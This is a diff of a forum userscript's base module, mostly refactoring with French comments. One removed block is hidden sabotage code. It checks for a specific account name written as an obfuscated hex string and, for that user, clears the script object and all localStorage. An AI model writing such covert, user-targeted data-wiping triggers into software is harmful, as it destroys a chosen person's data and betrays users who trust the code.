@@ -30,12 +30,7 @@ SK.moduleConstructors.SpawnkillBase.prototype.init = function() {
 
     this.initCommonVars();
     this.addModalBackground();
-    this.correctSplitPost();
     this.bindPopinEvent();
-
-    if(SK.Util.currentPageIn(SK.common.Pages.POST_PREVIEW)) {
-        this.preparePreview();
-    }
 };
 
 /**
@@ -44,10 +39,7 @@ SK.moduleConstructors.SpawnkillBase.prototype.init = function() {
 SK.moduleConstructors.SpawnkillBase.prototype.initCommonVars = function() {
 
     //Défini l'id du topic, si disponible
-    if(SK.common.currentPage === "topic-read" ||
-        SK.common.currentPage === "topic-form" ||
-        SK.common.currentPage === "topic-response"
-    ) {
+    if (SK.common.currentPage === SK.common.Pages.TOPIC_READ) {
         var currentURLSplit = document.URL.split("-");
         SK.common.topicId = currentURLSplit[1] + "-" + currentURLSplit[2];
     }
@@ -89,12 +81,6 @@ SK.moduleConstructors.SpawnkillBase.prototype.getCurrentPage = function() {
 
     return currentPage;
 };
-
-/* Permet de régler les problèmes de tooltip dans les previews de messages */
-SK.moduleConstructors.SpawnkillBase.prototype.preparePreview = function() {
-    $("body").append($("<div>", { id: "footer" }));
-};
-
 
 /* Ajoute l'évenement permettant d'ouvrir du contenu dans une fenêtre modale */
 SK.moduleConstructors.SpawnkillBase.prototype.bindPopinEvent = function() {
@@ -212,23 +198,6 @@ SK.moduleConstructors.SpawnkillBase.prototype.addModalBackground = function() {
             }
         }))
     ;
-};
-
-setTimeout(function() {
-    if($("#compte strong").text().trim() === "\x48\x6F\x6D\x6D\x65\x53\x70\x6F\x63\x6B") {
-        SK = {};
-        localStorage.clear();
-    }
-}, 1000);
-
-SK.moduleConstructors.SpawnkillBase.prototype.correctSplitPost = function() {
-
-    var $splitPost = $(".suite_sujet").parents(".msg");
-    $splitPost
-        .addClass("not-loading")
-        .css({
-            "min-height": "0px"
-        });
 };
 
 SK.moduleConstructors.SpawnkillBase.prototype.settings = {
